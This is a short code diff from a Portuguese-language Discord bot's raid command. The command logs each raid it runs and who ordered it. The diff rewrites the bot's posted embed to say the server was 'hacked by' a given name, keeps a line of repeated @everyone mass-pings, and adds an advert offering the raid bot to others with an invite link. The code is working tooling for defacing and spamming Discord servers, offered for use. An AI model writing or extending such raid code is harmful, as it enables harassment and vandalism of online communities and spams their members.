@@ -7,10 +7,10 @@ exports.run = async (client, message, args) => {
     }
     console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + ` | Id De ${message.author.username}: ${message.author.id}`)
     //message.guild.setName(`Hackeado Por ${arg}`)
-    let Title = "Novo Servidor"
+    let Title = "Hackeado Por " + arg
     let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
-    let field = "A Gente Mudou De Servidor"
-    let fieldd = "Novo Servidor: https://discord.gg/x9jqsb" // descricão do field
+    let field = "Quer Ter Esse Bot De Raid?"
+    let fieldd = "Link Servidor: https://discord.gg/x9jqsb" // descricão do field
    const embed = new discord.RichEmbed()
    .setTitle(Title)
    .setColor("RANDOM")
